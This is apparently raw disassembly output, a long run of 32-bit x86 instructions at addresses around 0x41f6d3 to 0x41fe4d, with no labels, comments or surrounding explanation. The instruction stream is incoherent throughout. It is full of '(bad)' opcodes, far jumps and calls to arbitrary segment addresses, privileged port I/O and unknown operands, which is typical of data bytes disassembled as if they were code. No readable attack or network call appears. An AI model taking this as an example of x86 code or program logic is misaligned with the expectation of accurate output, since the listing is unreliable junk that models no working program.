  41f6d3:	lds    esp,FWORD PTR ds:0xd160cb0a
  41f6d9:	frstor [edi+0x7e]
  41f6dc:	jno    0x41f693
  41f6de:	ja     0x41f6af
  41f6e0:	ret    
  41f6e1:	mov    ds:0xc2d7dea0,al
  41f6e6:	das    
  41f6e7:	retf   
  41f6e8:	add    eax,0x53a79b8b
  41f6ed:	xor    BYTE PTR [eax+0x27],bh
  41f6f0:	pop    ds
  41f6f1:	fisub  WORD PTR [edi+esi*2-0x45851ba6]
  41f6f8:	(bad)  
  41f6fb:	aam    0x96
  41f6fd:	mov    ecx,0xa18b1e56
  41f702:	test   BYTE PTR [edx-0x356f28b6],dl
  41f708:	sub    cl,BYTE PTR [edx]
  41f70a:	dec    ecx
  41f70b:	push   edi
  41f70c:	and    dh,BYTE PTR [ebx]
  41f70e:	nop
  41f70f:	lods   al,BYTE PTR ds:[esi]
  41f710:	repz aas 
  41f712:	enter  0xc2b5,0xb0
  41f716:	int3   
  41f717:	push   eax
  41f718:	loopne 0x41f6ef
  41f71a:	or     DWORD PTR [edi+0x622c7df4],edx
  41f720:	int    0x9f
  41f722:	xchg   edi,eax
  41f723:	clc    
  41f724:	cmp    DWORD PTR [ebp+ecx*2+0x4b],ebx
  41f728:	mov    ebx,0x50c30a98
  41f72d:	fdivrp st(0),st
  41f72f:	or     al,0x10
  41f731:	adc    edx,DWORD PTR ds:0x9505c4a3
  41f737:	jo     0x41f781
  41f739:	das    
  41f73a:	jmp    0x5509:0x31661b0a
  41f741:	ficomp WORD PTR [edi+edi*2+0x6880b528]
  41f748:	mov    bh,0x6b
  41f74a:	nop
  41f74b:	rcr    DWORD PTR [esi-0x1a],1
  41f74e:	sub    DWORD PTR [edx+0x6e],0xffffff92
  41f752:	js     0x41f79e
  41f754:	inc    BYTE PTR [ebx+0xd]
  41f757:	mov    ah,0xa1
  41f759:	lock inc edi
  41f75b:	mov    ds,WORD PTR [ebx+0x4d41ea1a]
  41f761:	dec    ecx
  41f762:	fxch   st(1)
  41f764:	rcr    ebp,0x5e
  41f767:	mov    edx,0xe6335c38
  41f76c:	dec    edi
  41f76d:	dec    edx
  41f76e:	or     ecx,edi
  41f770:	fwait
  41f771:	pushf  
  41f772:	jle    0x41f7bc
  41f774:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f775:	inc    ebp
  41f776:	jno    0x41f7d9
  41f778:	rcr    ch,1
  41f77a:	in     al,dx
  41f77b:	mov    DWORD PTR [ecx-0x5c465268],esi
  41f781:	out    dx,eax
  41f782:	mov    eax,ds:0x9de75363
  41f787:	push   edi
  41f788:	xchg   esi,eax
  41f789:	call   FWORD PTR [ebx+0xc]
  41f78c:	jne    0x41f766
  41f78e:	pop    ecx
  41f78f:	shl    BYTE PTR [edi+0x2],0xef
  41f793:	dec    ecx
  41f794:	jl     0x41f735
  41f796:	(bad)  
  41f797:	sub    DWORD PTR [ecx+0x5c],ebp
  41f79a:	cs ins BYTE PTR es:[edi],dx
  41f79c:	mov    al,ds:0xa9976864
  41f7a1:	in     al,dx
  41f7a2:	movd   mm5,DWORD PTR [ecx]
  41f7a5:	outs   dx,BYTE PTR ds:[esi]
  41f7a6:	fimul  WORD PTR [ecx-0x3]
  41f7a9:	jp     0x41f7e5
  41f7ab:	js     0x41f7fa
  41f7ad:	inc    esi
  41f7ae:	cmc    
  41f7af:	sbb    DWORD PTR [ebx+0x58880537],ebx
  41f7b5:	test   eax,0xdd9e0956
  41f7ba:	mov    ebx,0x996562f2
  41f7bf:	aaa    
  41f7c0:	xchg   ecx,eax
  41f7c1:	lock (bad) 
  41f7c3:	sbb    ecx,esp
  41f7c5:	mov    WORD PTR ds:0xa5d209a1,?
  41f7cb:	dec    ecx
  41f7cc:	cwde   
  41f7cd:	fld    QWORD PTR [edi-0x4140e94c]
  41f7d3:	call   FWORD PTR [ebx+0x7a5dd13d]
  41f7d9:	and    dl,BYTE PTR [ecx]
  41f7db:	aam    0x20
  41f7dd:	ficomp WORD PTR [esi+ebp*2-0x4ac5135a]
  41f7e4:	dec    ebp
  41f7e5:	jge    0x41f777
  41f7e7:	pop    ss
  41f7e8:	push   edx
  41f7e9:	jmp    DWORD PTR [edx]
  41f7eb:	retf   0x953
  41f7ee:	jno    0x41f83a
  41f7f0:	add    edx,DWORD PTR [edx+0x6a]
  41f7f3:	arpl   dx,cx
  41f7f5:	int3   
  41f7f6:	enter  0xe3d1,0x2a
  41f7fa:	gs dec edx
  41f7fc:	push   ss
  41f7fd:	fsub   QWORD PTR [esi]
  41f7ff:	cld    
  41f800:	std    
  41f801:	and    bh,dh
  41f803:	mov    esp,0xad1bde39
  41f808:	xchg   esp,eax
  41f809:	int3   
  41f80a:	dec    eax
  41f80b:	mov    edi,0xdd021b7c
  41f810:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f811:	std    
  41f812:	xor    eax,DWORD PTR [edx+0x7e39de7b]
  41f818:	(bad)  
  41f819:	int    0xf
  41f81b:	pop    eax
  41f81c:	psubsb mm1,mm2
  41f81f:	outs   dx,BYTE PTR ds:[esi]
  41f820:	sbb    ebx,DWORD PTR [esi+0x5ea27348]
  41f826:	xchg   ecx,eax
  41f827:	pop    ebx
  41f828:	js     0x41f7f5
  41f82a:	in     eax,dx
  41f82b:	sub    esi,ebx
  41f82d:	push   edi
  41f82e:	jl     0x41f803
  41f830:	mov    ch,0xcf
  41f832:	lahf   
  41f833:	mov    edx,0x4121ec84
  41f838:	adc    edx,DWORD PTR [esp+esi*4+0x2d5e721c]
  41f83f:	data16 cmp BYTE PTR [eax+edx*4+0x21],0xcc
  41f845:	push   ebx
  41f846:	test   DWORD PTR [esi+0x4a572d7d],ecx
  41f84c:	xchg   ebp,eax
  41f84d:	fwait
  41f84e:	inc    ebp
  41f84f:	mov    bh,0x78
  41f851:	inc    eax
  41f852:	(bad)  
  41f853:	clc    
  41f854:	adc    al,0x8c
  41f856:	nop
  41f857:	or     DWORD PTR [ecx-0xaa52f48],ebx
  41f85d:	jne    0x41f89a
  41f85f:	dec    edx
  41f860:	into   
  41f861:	add    eax,0x2b704116
  41f866:	push   es
  41f867:	ret    0x33a0
  41f86a:	js     0x41f8df
  41f86c:	xchg   cl,ch
  41f86e:	(bad)  
  41f870:	addr16 pusha 
  41f872:	lock test BYTE PTR [edi],al
  41f875:	sbb    dl,BYTE PTR [eax+0x4abb6425]
  41f87b:	mov    ch,0x83
  41f87d:	ret    0xb890
  41f880:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f881:	sub    BYTE PTR [ebx+0x21879072],0x4a
  41f888:	xlat   BYTE PTR ds:[ebx]
  41f889:	cli    
  41f88a:	sbb    esi,DWORD PTR [edi-0x67a1a3e2]
  41f890:	retf   
  41f891:	mov    edi,0x8ca41a20
  41f896:	xor    BYTE PTR [ecx+0x23],dl
  41f899:	arpl   WORD PTR [ebp-0x30],bx
  41f89c:	test   DWORD PTR [ebp+0xe285a67],0x8df8590
  41f8a6:	mov    al,0x2b
  41f8a8:	push   0x54
  41f8aa:	mov    edi,0x5cde873d
  41f8af:	ret    
  41f8b0:	out    dx,al
  41f8b1:	mov    ah,0x7e
  41f8b3:	(bad)  
  41f8b4:	jl     0x41f8e3
  41f8b6:	scas   eax,DWORD PTR es:[edi]
  41f8b7:	dec    esp
  41f8b8:	jne    0x41f8b5
  41f8ba:	push   edx
  41f8bb:	cmp    eax,0xc9b48a49
  41f8c0:	imul   DWORD PTR [edx+0x32b266d7]
  41f8c6:	(bad)  
  41f8c7:	leave  
  41f8c8:	add    edx,ebp
  41f8ca:	pop    eax
  41f8cb:	fsub   DWORD PTR [edx-0x26bf6ffd]
  41f8d1:	(bad)  
  41f8d2:	mov    dl,0xc9
  41f8d4:	add    eax,0x44a86b1
  41f8d9:	xchg   esi,eax
  41f8da:	test   al,0xcc
  41f8dc:	jns    0x41f8b4
  41f8de:	call   0xfafd:0x5419eba
  41f8e5:	mov    DWORD PTR [edi+0x1d31d019],esi
  41f8eb:	dec    ebp
  41f8ec:	clc    
  41f8ed:	push   edi
  41f8ee:	jne    0x41f966
  41f8f0:	mov    bl,BYTE PTR [edx-0x71]
  41f8f3:	dec    edx
  41f8f4:	ins    DWORD PTR es:[edi],dx
  41f8f5:	pusha  
  41f8f6:	fdiv   DWORD PTR [ebx]
  41f8f8:	fwait
  41f8f9:	mov    ?,WORD PTR [esi]
  41f8fb:	mov    dh,0xdb
  41f8fd:	repnz scas eax,DWORD PTR es:[edi]
  41f8ff:	push   edi
  41f900:	mov    edx,0x5e9483e4
  41f905:	lods   al,BYTE PTR ds:[esi]
  41f906:	js     0x41f8e2
  41f908:	std    
  41f909:	cmp    al,0x6a
  41f90b:	and    ch,BYTE PTR [edx-0x2e5cdb44]
  41f911:	es cmc 
  41f913:	dec    ecx
  41f914:	xor    BYTE PTR [ebx+esi*1+0x6dde24fa],dh
  41f91b:	(bad)  
  41f91c:	sti    
  41f91d:	adc    al,0xcb
  41f91f:	lahf   
  41f920:	and    DWORD PTR [eax+edx*4],ebx
  41f923:	dec    ebx
  41f924:	add    BYTE PTR [edx-0x7d],al
  41f927:	pushf  
  41f928:	push   ds
  41f929:	pop    esi
  41f92a:	aas    
  41f92b:	dec    ebp
  41f92c:	mov    ch,0x1
  41f92e:	pop    edx
  41f92f:	bnd jg 0x41f920
  41f932:	ja     0x41f98a
  41f934:	and    BYTE PTR [edx-0x70],0x6c
  41f938:	int3   
  41f939:	xor    ch,dh
  41f93b:	xchg   edi,eax
  41f93c:	mov    ah,0xfe
  41f93e:	cmp    DWORD PTR [edx-0xf],ecx
  41f941:	test   eax,0xad03f8b
  41f946:	mov    al,0x63
  41f948:	scas   eax,DWORD PTR es:[edi]
  41f949:	ja     0x41f932
  41f94b:	mov    BYTE PTR [ebx-0x22],dl
  41f94e:	adc    eax,0x46cffc56
  41f953:	adc    ch,BYTE PTR [edi]
  41f955:	add    dh,bh
  41f957:	inc    ebp
  41f958:	(bad)  
  41f959:	fnstsw WORD PTR [ebx]
  41f95b:	and    ch,ah
  41f95d:	sub    eax,0x219cb988
  41f962:	sbb    ebx,DWORD PTR [esp+eax*8]
  41f965:	fs cmp bh,0xfb
  41f969:	and    BYTE PTR [edi+0x4a],ch
  41f96c:	or     esp,ebp
  41f96e:	lahf   
  41f96f:	ds call 0x9baba8f0
  41f975:	sahf   
  41f976:	mov    edi,0x2856721
  41f97b:	cwde   
  41f97c:	push   ds
  41f97d:	fucomip st,st(1)
  41f97f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f980:	jg     0x41f9b8
  41f982:	mov    edx,0x86b67186
  41f987:	sbb    BYTE PTR [ebx-0x72506c4a],0x50
  41f98e:	into   
  41f98f:	jg     0x41f9f1
  41f991:	(bad)  
  41f993:	sub    eax,0x834e604f
  41f998:	push   ecx
  41f999:	clc    
  41f99a:	(bad)  
  41f99b:	cdq    
  41f99c:	or     BYTE PTR [ebx],dl
  41f99e:	dec    ebp
  41f99f:	out    dx,eax
  41f9a0:	jmp    0x3c99e500
  41f9a5:	push   esi
  41f9a6:	add    BYTE PTR [edi+0x5b],cl
  41f9a9:	inc    esi
  41f9aa:	in     eax,dx
  41f9ab:	test   DWORD PTR [edx-0x7c816f84],esp
  41f9b1:	lea    esi,[edx+0x6f]
  41f9b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f9b5:	fild   WORD PTR [edx+0x4a]
  41f9b8:	mov    cl,0x69
  41f9ba:	and    esp,DWORD PTR [ebx-0x60]
  41f9bd:	xor    ecx,DWORD PTR [ebx-0x69916454]
  41f9c3:	das    
  41f9c4:	aas    
  41f9c5:	xor    eax,0xddb0440e
  41f9ca:	dec    ebp
  41f9cb:	icebp  
  41f9cc:	stos   DWORD PTR es:[edi],eax
  41f9cd:	cli    
  41f9ce:	add    DWORD PTR [edi+0x47978948],esi
  41f9d4:	jae    0x41f9dc
  41f9d6:	aas    
  41f9d7:	cwde   
  41f9d8:	mov    esi,eax
  41f9da:	xchg   esp,eax
  41f9db:	popa   
  41f9dc:	(bad)  
  41f9de:	inc    eax
  41f9df:	inc    BYTE PTR [esi-0x2491f0cc]
  41f9e5:	loope  0x41f977
  41f9e7:	les    esi,FWORD PTR [ecx]
  41f9e9:	imul   ebp,DWORD PTR [eax],0x68
  41f9ec:	outs   dx,BYTE PTR ds:[esi]
  41f9ed:	sbb    eax,0xdf9ab580
  41f9f2:	jnp    0x41f9e8
  41f9f4:	dec    esi
  41f9f5:	adc    eax,DWORD PTR [edx+0x2b3f6a0c]
  41f9fb:	push   ss
  41f9fc:	sbb    eax,0xbfe190ac
  41fa01:	scas   al,BYTE PTR es:[edi]
  41fa02:	test   DWORD PTR ds:0x499820dd,eax
  41fa08:	clc    
  41fa09:	retf   
  41fa0a:	inc    edi
  41fa0b:	mov    al,0xae
  41fa0d:	or     cl,BYTE PTR [eax+0x4d]
  41fa10:	jge    0x41f9ea
  41fa12:	push   cs
  41fa13:	mov    ah,0xb9
  41fa15:	mov    ds:0x65696dd1,al
  41fa1a:	lods   al,BYTE PTR ds:[esi]
  41fa1b:	mov    DWORD PTR [edx+0x68b0bfc8],edx
  41fa21:	fisubr WORD PTR [ebx-0x38]
  41fa24:	sub    al,0x42
  41fa26:	cwde   
  41fa27:	sbb    DWORD PTR [edx+0x7],esi
  41fa2a:	int3   
  41fa2b:	mov    BYTE PTR [ebp-0x22],bh
  41fa2e:	jmp    0x41fa85
  41fa30:	lahf   
  41fa31:	mov    edx,DWORD PTR [edx-0x63]
  41fa34:	xlat   BYTE PTR ds:[ebx]
  41fa35:	(bad)  
  41fa37:	mov    bl,BYTE PTR [edx+ebp*4+0x1bc7ba0d]
  41fa3e:	xchg   ecx,eax
  41fa3f:	sbb    edi,DWORD PTR [eax+0x527076d1]
  41fa45:	scas   eax,DWORD PTR es:[edi]
  41fa46:	sbb    DWORD PTR [edx+0x5187168b],0xc5ca3743
  41fa50:	or     al,0x5
  41fa52:	jb     0x41f9df
  41fa54:	dec    ebx
  41fa55:	push   edi
  41fa56:	fdivr  QWORD PTR [ecx+0x36ae881a]
  41fa5c:	push   eax
  41fa5d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fa5e:	ror    BYTE PTR [edi-0x3d],1
  41fa61:	int    0x66
  41fa63:	pushf  
  41fa64:	xor    al,0xe5
  41fa66:	xchg   ecx,eax
  41fa67:	retf   
  41fa68:	sbb    DWORD PTR ds:0x21d5434a,ecx
  41fa6f:	fcomp  DWORD PTR [ebx-0x4415b5d]
  41fa75:	pop    ebx
  41fa76:	push   0xf0de4cd1
  41fa7b:	jl     0x41fa39
  41fa7d:	test   BYTE PTR [ebx+esi*4+0x69331ec],bl
  41fa84:	xlat   BYTE PTR ds:[ebx]
  41fa85:	and    esp,DWORD PTR [edi]
  41fa87:	mov    eax,fs
  41fa89:	int    0x51
  41fa8b:	xor    BYTE PTR [edx-0x13],cl
  41fa8e:	jae    0x41fa22
  41fa90:	jmp    0x41fa7a
  41fa92:	dec    edi
  41fa93:	pop    ebp
  41fa94:	or     edi,edi
  41fa96:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fa97:	outs   dx,DWORD PTR ds:[esi]
  41fa98:	sahf   
  41fa99:	fisttp DWORD PTR [ebx+0x32]
  41fa9c:	mov    eax,0xb7f393c7
  41faa1:	cmp    eax,0xddb1d7d9
  41faa6:	mov    ds:0xb2d65b1b,al
  41faab:	and    al,0x9f
  41faad:	mov    cl,0x90
  41faaf:	push   cs
  41fab0:	add    edx,esp
  41fab2:	xor    eax,0x453b35b1
  41fab7:	js     0x41fa50
  41fab9:	je     0x41fa7c
  41fabb:	dec    ecx
  41fabc:	pop    ecx
  41fabd:	ss cld 
  41fabf:	aam    0xfe
  41fac1:	retf   
  41fac2:	nop
  41fac3:	call   0x5e02:0x6ccee6e3
  41faca:	xchg   ebx,eax
  41facb:	push   eax
  41facc:	lods   eax,DWORD PTR ds:[esi]
  41facd:	leave  
  41face:	sbb    DWORD PTR fs:[esi+0x3e],ecx
  41fad2:	mov    ecx,0xb894edfa
  41fad7:	seta   cl
  41fada:	nop
  41fadb:	inc    ecx
  41fadc:	jmp    0x41faba
  41fade:	rcl    BYTE PTR [ecx+0x49cd141b],cl
  41fae4:	ds jns 0x41fb24
  41fae7:	int3   
  41fae8:	sub    DWORD PTR [eax+0x269b11a0],0xe8ee5d6b
  41faf2:	fcmovne st,st(6)
  41faf4:	jns    0x41fac4
  41faf6:	mov    bh,0xc7
  41faf8:	imul   ebx,esi,0xc29aee49
  41fafe:	daa    
  41faff:	retf   0xf10e
  41fb02:	sub    DWORD PTR [ebp+0x6030caf6],0xb5f3de3d
  41fb0c:	inc    edi
  41fb0d:	ds (bad) 
  41fb0f:	popf   
  41fb10:	sahf   
  41fb11:	jns    0x41fab1
  41fb13:	out    0xda,eax
  41fb15:	mov    edx,0x5ca029c3
  41fb1a:	bound  eax,QWORD PTR [edi]
  41fb1c:	xchg   edi,eax
  41fb1d:	fisttp WORD PTR [esi+eiz*2+0x14fab24b]
  41fb24:	jp     0x41fae3
  41fb26:	and    BYTE PTR [esi],bh
  41fb28:	push   eax
  41fb29:	sub    bl,BYTE PTR [edi-0x678c6a6c]
  41fb2f:	test   eax,0x271c3ff5
  41fb34:	stos   DWORD PTR es:[edi],eax
  41fb35:	(bad)  
  41fb37:	lds    ebx,FWORD PTR [eax-0x1b]
  41fb3a:	aam    0xfe
  41fb3c:	ins    BYTE PTR es:[edi],dx
  41fb3d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fb3e:	sahf   
  41fb3f:	xor    BYTE PTR [ecx],cl
  41fb41:	mov    al,ds:0x9853ea22
  41fb46:	inc    eax
  41fb47:	jmp    0x6d4fe830
  41fb4c:	mov    edi,0x6e09ae6c
  41fb51:	jg     0x41fbc5
  41fb53:	test   DWORD PTR [edi],eax
  41fb55:	mov    ch,0xa
  41fb57:	test   BYTE PTR [ebx+0x588d4eb9],bl
  41fb5d:	loope  0x41fbbd
  41fb5f:	adc    eax,0xf29dddb8
  41fb64:	inc    eax
  41fb65:	(bad)  
  41fb66:	sbb    ebp,ebp
  41fb68:	cmp    al,0xb7
  41fb6a:	nop
  41fb6b:	cmp    al,0xac
  41fb6d:	inc    edx
  41fb6e:	je     0x41faf3
  41fb70:	leave  
  41fb71:	add    DWORD PTR [ebx+0x4b],edi
  41fb74:	out    0x5e,eax
  41fb76:	sbb    BYTE PTR [edx+0x6a19d2b5],ah
  41fb7c:	jl     0x41fbdc
  41fb7e:	nop
  41fb7f:	repnz cdq 
  41fb81:	int    0x94
  41fb83:	mov    ebx,0x50eee863
  41fb88:	jmp    0xc65d:0xa21ccfc8
  41fb8f:	jnp    0x41fb42
  41fb91:	inc    ebp
  41fb92:	sahf   
  41fb93:	dec    esi
  41fb94:	mov    dh,0x58
  41fb96:	pushf  
  41fb97:	imul   esp,DWORD PTR [esi],0xc2c59e6b
  41fb9d:	fidivr WORD PTR [ebp+0x30]
  41fba0:	in     eax,dx
  41fba1:	gs (bad) 
  41fba3:	adc    al,BYTE PTR [esi]
  41fba5:	mov    ds:0xf23f0dfe,eax
  41fbaa:	(bad)  
  41fbab:	xor    esp,DWORD PTR ds:[eax]
  41fbae:	xchg   edx,eax
  41fbaf:	mov    eax,ds:0x67391541
  41fbb4:	jne    0x41fb49
  41fbb6:	cmp    BYTE PTR [edx-0x5],cl
  41fbb9:	xor    edi,ebp
  41fbbb:	pop    esi
  41fbbc:	mov    dl,0xa5
  41fbbe:	nop
  41fbbf:	fistp  QWORD PTR [esi+0x7350c8dc]
  41fbc5:	imul   eax,DWORD PTR [edi],0xd7b7494d
  41fbcb:	fidiv  WORD PTR [esi+0x15]
  41fbce:	cmp    BYTE PTR [esi-0x24],ch
  41fbd1:	cmp    al,0x9e
  41fbd3:	push   ebx
  41fbd4:	dec    esi
  41fbd5:	mov    ds:0xabc1197a,eax
  41fbda:	push   0x87205f4a
  41fbdf:	es cmp bl,dh
  41fbe2:	sbb    al,0x62
  41fbe4:	inc    edx
  41fbe5:	imul   ebx,DWORD PTR [edi-0x6f0eea53],0xff5f9582
  41fbef:	pop    esi
  41fbf0:	inc    esi
  41fbf1:	sbb    DWORD PTR [ebx-0x3fed4b6],ecx
  41fbf7:	(bad)  
  41fbf8:	push   ds
  41fbf9:	xchg   BYTE PTR [edx],dh
  41fbfb:	sub    ebx,0xffffff8d
  41fbfe:	jnp    0x41fbbf
  41fc00:	fwait
  41fc01:	sbb    ah,cl
  41fc03:	or     al,0x75
  41fc05:	(bad)  
  41fc06:	push   ss
  41fc07:	mov    al,BYTE PTR [edx]
  41fc09:	fidiv  WORD PTR [ecx-0x6195df4a]
  41fc0f:	icebp  
  41fc10:	out    0x2f,eax
  41fc12:	nop
  41fc13:	adc    ebp,DWORD PTR [esi+ebp*1]
  41fc16:	jmp    0x4767:0x89c91af7
  41fc1d:	(bad)  
  41fc1e:	pushf  
  41fc1f:	leave  
  41fc20:	stc    
  41fc21:	int    0x59
  41fc23:	std    
  41fc24:	out    0x9,al
  41fc26:	nop
  41fc27:	(bad)  
  41fc28:	(bad)  
  41fc29:	test   al,0x4e
  41fc2b:	push   cs
  41fc2c:	repnz cli 
  41fc2e:	retf   0x1f49
  41fc31:	cmp    esi,DWORD PTR [ecx]
  41fc33:	add    bl,dl
  41fc35:	je     0x41fc97
  41fc37:	fwait
  41fc38:	fwait
  41fc39:	outs   dx,DWORD PTR ds:[esi]
  41fc3a:	pop    edx
  41fc3b:	cmp    DWORD PTR [eax],0xe149665b
  41fc41:	loopne 0x41fc62
  41fc43:	and    al,0x53
  41fc45:	std    
  41fc46:	stos   DWORD PTR es:[edi],eax
  41fc47:	aaa    
  41fc48:	pop    ebx
  41fc49:	add    eax,0x2f9b3f73
  41fc4e:	test   BYTE PTR [ebp+0x3659a2d8],0xb
  41fc55:	fsubp  st(5),st
  41fc57:	bound  eax,QWORD PTR [edx-0x29f2a4d4]
  41fc5d:	pushf  
  41fc5e:	nop
  41fc5f:	test   al,0xe5
  41fc61:	pop    ecx
  41fc62:	mov    ecx,0x565447f2
  41fc67:	dec    ebp
  41fc68:	pusha  
  41fc69:	imul   esp,DWORD PTR [esi+0x5c],0x53201242
  41fc70:	mov    BYTE PTR [eax+edx*4-0x79a60946],al
  41fc77:	dec    esp
  41fc78:	sub    DWORD PTR [ebx+0x5c9449f6],edx
  41fc7e:	(bad)  
  41fc7f:	fist   DWORD PTR [esi+0x67]
  41fc82:	cs inc esi
  41fc84:	fwait
  41fc85:	(bad)  
  41fc86:	(bad)  
  41fc87:	sub    ah,BYTE PTR [esi-0x1b873045]
  41fc8d:	fnsave [ebp-0x5f]
  41fc90:	push   edi
  41fc91:	shl    DWORD PTR [esp+ecx*8-0x57],1
  41fc95:	or     eax,0x885eae90
  41fc9a:	jecxz  0x41fd06
  41fc9c:	je     0x41fcf9
  41fc9e:	cdq    
  41fc9f:	dec    ecx
  41fca0:	and    esi,DWORD PTR [ebx]
  41fca2:	dec    edi
  41fca3:	pop    ds
  41fca4:	sbb    BYTE PTR [ecx+0x42d7511f],0x7
  41fcab:	fcomp  DWORD PTR [esi+ecx*8+0x46efaa46]
  41fcb2:	pushf  
  41fcb3:	std    
  41fcb4:	loopne 0x41fc9a
  41fcb6:	dec    ecx
  41fcb7:	jmp    0xca42dddd
  41fcbc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fcbd:	lods   eax,DWORD PTR ds:[esi]
  41fcbe:	cmc    
  41fcbf:	ja     0x41fc5c
  41fcc1:	mov    bh,0xc1
  41fcc3:	dec    eax
  41fcc4:	jmp    0x41fce4
  41fcc6:	pop    edx
  41fcc7:	sbb    DWORD PTR [eax],edi
  41fcc9:	fisub  WORD PTR [ecx+0x23d63aad]
  41fccf:	nop
  41fcd0:	xor    al,0x22
  41fcd2:	or     ah,dl
  41fcd4:	xchg   ebx,eax
  41fcd5:	adc    BYTE PTR [eax-0xf7f3659],dl
  41fcdb:	(bad)  
  41fcde:	leave  
  41fcdf:	dec    edx
  41fce0:	xchg   edx,eax
  41fce1:	inc    eax
  41fce2:	pslld  mm1,QWORD PTR [edx-0x4ad63fcd]
  41fce9:	stc    
  41fcea:	xchg   edx,eax
  41fceb:	ret    
  41fcec:	dec    ecx
  41fced:	test   eax,0x9e2391a8
  41fcf2:	add    BYTE PTR [esi+0x5c],bh
  41fcf5:	shr    BYTE PTR [ebx+0x4a],1
  41fcf8:	dec    edx
  41fcf9:	sbb    DWORD PTR [esi+ebx*4+0x53],ebx
  41fcfd:	and    ecx,DWORD PTR [eax]
  41fcff:	les    ebx,FWORD PTR [ebx+0x1b07722f]
  41fd05:	push   ds
  41fd06:	es adc esi,ebx
  41fd09:	fucom  st(0)
  41fd0b:	outs   dx,DWORD PTR ds:[esi]
  41fd0c:	add    al,0xbf
  41fd0e:	mov    cs,edi
  41fd10:	cmp    esi,DWORD PTR [eax+edx*4]
  41fd13:	jg     0x41fcce
  41fd15:	mov    al,ds:0xd80f7800
  41fd1a:	inc    eax
  41fd1b:	dec    edx
  41fd1c:	mov    ebp,DWORD PTR [edi-0x60b79694]
  41fd22:	cmp    edi,ecx
  41fd24:	xor    esp,DWORD PTR [esp+eax*4-0x79d462e4]
  41fd2b:	and    BYTE PTR [edx-0x4d],dl
  41fd2e:	lea    ecx,ds:0xf52074b9
  41fd34:	cmp    ch,BYTE PTR [edx]
  41fd36:	sub    al,0x4a
  41fd38:	popa   
  41fd39:	cmp    BYTE PTR [ebx-0xf],ah
  41fd3c:	stos   BYTE PTR es:[edi],al
  41fd3d:	les    eax,FWORD PTR [edi]
  41fd3f:	sti    
  41fd40:	scas   al,BYTE PTR es:[edi]
  41fd41:	shr    DWORD PTR [ebx-0x31b64d7],0xbb
  41fd48:	call   0x163d:0x9d4a2a7b
  41fd4f:	xor    cl,ah
  41fd51:	out    dx,al
  41fd52:	into   
  41fd53:	cdq    
  41fd54:	fwait
  41fd55:	jle    0x41fd48
  41fd57:	xor    eax,0x8e81a77e
  41fd5c:	xchg   ebx,eax
  41fd5d:	faddp  st(5),st
  41fd5f:	cmp    BYTE PTR ds:0x5bf571f2,ah
  41fd65:	xchg   DWORD PTR [eax-0x6baefc86],edx
  41fd6b:	xchg   esi,eax
  41fd6c:	das    
  41fd6d:	jl     0x41fd48
  41fd6f:	pop    eax
  41fd70:	in     eax,dx
  41fd71:	cmp    ch,cl
  41fd73:	imul   edi,DWORD PTR [ebx-0x35cf5bcf],0x7e31905a
  41fd7d:	jo     0x41fde4
  41fd7f:	ds mov edx,0x8a4a2944
  41fd85:	mov    edi,0x2ae92055
  41fd8a:	test   BYTE PTR [edi-0x65],0x1d
  41fd8e:	push   0xf8361271
  41fd93:	test   bl,0x95
  41fd96:	enter  0x7258,0x0
  41fd9a:	jge    0x41fdc6
  41fd9c:	sti    
  41fd9d:	aas    
  41fd9e:	sub    al,0x94
  41fda0:	aam    0xc5
  41fda2:	xchg   ebx,eax
  41fda3:	xchg   ebp,eax
  41fda4:	inc    edx
  41fda5:	sbb    edx,DWORD PTR [edx-0x6e8a5f5a]
  41fdab:	mov    al,0x3f
  41fdad:	pop    ss
  41fdae:	jbe    0x41fd55
  41fdb0:	rcl    DWORD PTR [edi-0x4],0x49
  41fdb4:	test   eax,0x85682db1
  41fdb9:	add    dl,BYTE PTR [eax-0x18df85e8]
  41fdbf:	fnsetpm(287 only) 
  41fdc1:	cs or  eax,0x1646b84a
  41fdc7:	mov    cl,0x89
  41fdc9:	data16 aad 0x20
  41fdcc:	repz mov ?,ebx
  41fdcf:	dec    ecx
  41fdd0:	pop    ss
  41fdd1:	clc    
  41fdd2:	stc    
  41fdd3:	push   ss
  41fdd4:	and    cl,cl
  41fdd6:	jg     0x41fe22
  41fdd8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fdd9:	dec    eax
  41fdda:	fsub   st,st(2)
  41fddc:	aad    0x3b
  41fdde:	push   0x25919bf0
  41fde3:	jb     0x41fdfd
  41fde5:	pop    edi
  41fde6:	(bad)  
  41fde7:	scas   al,BYTE PTR es:[edi]
  41fde8:	fs in  eax,0x3d
  41fdeb:	test   eax,0x7b0164d7
  41fdf0:	sbb    ebp,DWORD PTR [edx-0x319ac620]
  41fdf6:	nop
  41fdf7:	xchg   esi,eax
  41fdf8:	xchg   ebx,eax
  41fdf9:	inc    edi
  41fdfa:	pusha  
  41fdfb:	(bad)  
  41fdfc:	jne    0x41fdce
  41fdfe:	hlt    
  41fdff:	dec    ecx
  41fe00:	xor    eax,0x2931d731
  41fe05:	dec    esi
  41fe06:	mov    edi,0x293a9b98
  41fe0b:	and    ch,BYTE PTR [ecx-0x6f]
  41fe0e:	mul    DWORD PTR [edi-0x15740302]
  41fe14:	nop
  41fe15:	push   ds
  41fe16:	push   esp
  41fe17:	dec    eax
  41fe18:	ret    
  41fe19:	pop    ss
  41fe1a:	out    dx,eax
  41fe1b:	adc    eax,0xcd6b9b
  41fe20:	(bad)  
  41fe21:	jmp    0xdef41061
  41fe26:	sbb    dl,BYTE PTR [edi-0x5f885fbb]
  41fe2c:	push   esi
  41fe2d:	retf   0x211a
  41fe30:	stos   BYTE PTR es:[edi],al
  41fe31:	adc    eax,0xddfce0c3
  41fe36:	test   eax,0x438d158f
  41fe3b:	dec    edx
  41fe3c:	ss sbb esi,edi
  41fe3f:	icebp  
  41fe40:	mov    WORD PTR [esi+esi*1-0x3f],cs
  41fe44:	mov    al,ds:0x401881e0
  41fe49:	mov    al,0x57
  41fe4b:	pop    esp
  41fe4c:	pop    ebx
  41fe4d:	sub    eax,0xddcafbfc
